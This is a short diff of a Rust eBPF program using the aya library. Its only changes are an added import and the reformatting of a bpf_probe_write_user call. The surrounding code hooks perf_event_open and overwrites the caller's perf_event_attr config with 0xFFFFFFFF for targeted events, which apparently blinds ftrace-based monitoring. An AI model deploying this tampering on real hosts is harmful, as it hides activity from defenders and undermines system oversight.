@@ -2,6 +2,7 @@ use aya_ebpf::{
     helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_write_user, bpf_tail_call},
     macros::{kprobe, kretprobe},
     programs::{ProbeContext, RetProbeContext},
+    EbpfContext,
 };
 use common::{
     EventHeader, EVENT_BPF_ITER_ABUSED, EVENT_FTRACE_BLINDED, EVENT_KPROBE_DETECTED,
@@ -148,10 +149,7 @@ fn try_perf_event_open(ctx: &ProbeContext) -> Result<u32, i64> {
     if unsafe { FTRACE_BLIND_TARGETS.get(&config) }.is_some() {
         let fake_config: u64 = 0xFFFFFFFF;
         unsafe {
-            let _ = bpf_probe_write_user(
-                (attr_ptr + 8) as *mut u64,
-                &fake_config as *const u64,
-            );
+            let _ = bpf_probe_write_user((attr_ptr + 8) as *mut u64, &fake_config as *const u64);
         }
 
         let event = EventHeader {
